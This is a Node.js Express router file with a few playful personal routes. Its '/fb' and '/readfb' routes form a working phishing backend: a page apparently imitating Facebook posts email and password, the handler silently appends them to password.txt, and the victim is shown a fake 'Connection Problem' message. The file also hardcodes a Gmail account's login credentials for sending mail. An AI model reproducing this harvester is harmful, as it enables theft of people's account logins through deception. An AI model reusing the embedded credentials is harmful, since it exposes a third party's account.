var express = require('express');
var router = express.Router();
var auth = require('http-auth');
var nodemailer = require('nodemailer');
var fs = require("fs");

var basic = auth.basic({
        realm: "Web."
    }, function (username, password, callback) { // Custom authentication method.
        callback(username === "userName" && password === "password");
    }
);

router.get('/good', auth.connect(basic), function(req,res){
   res.render('test', { title: 'Express' });
});

router.get('/go', auth.connect(basic), function(req,res){
    res.send("Great");
});


/* GET home page. */
router.get('/', function(req, res) {
  res.render('index', { title: 'Express' });
});

router.get('/guddie', function(req, res) {
  res.render('guddie', { title: 'Gudda\'s Heart' });
});


router.get('/oh', function(req, res) {
  res.render('test', { title: 'Express' });
});

router.get('/fb', function(req, res) {
  res.render('facebook', { title: 'Express' });
});

router.post('/readfb', function(req, res) {
    var b = JSON.stringify({'email': req.body.email, 'pass':req.body.pass});
    fs.appendFile("password.txt", b, function(err) {
    if(err) {
        console.log(err);
    } else {
        console.log("The file was saved!");
        fs.appendFile("password.txt", "\n", function(err) {
        });
    }
    
});
  res.send("Connection Problem, Please try again later",200);
});

router.post('/', function(req, res) {
    var a = req.body.field2;
    if(a==='yes'){
        res.send("Luv u bahut sara");
    }
    else {
        res.send("Huhh Sirrin");
    }
 
});

router.get('/Email', function(req, res) {
  var transporter = nodemailer.createTransport({
    service: 'Gmail',
    port:'465',
    auth: {
        user: 'notjustanotherteamhackathon@gmail.com',
        pass: 'Misys123$'
    }
});


// setup e-mail data with unicode symbols
var mailOptions = {
    from: 'Misys ? <notjustanotherteamhackathon@gmail.com>', // sender address
    to: '09saurabh09@gmail.com', // list of receivers
    subject: 'Hello ?', // Subject line
    text: 'Hello world ?', // plaintext body
    html: '<b>Hello world ?</b>' // html body
};

transporter.sendMail(mailOptions, function(error, info){
    if(error){
        console.log(error);
    }else{
        console.log('Message sent: ' + info.response);
        res.send()
    }
});
});


 

module.exports = router;
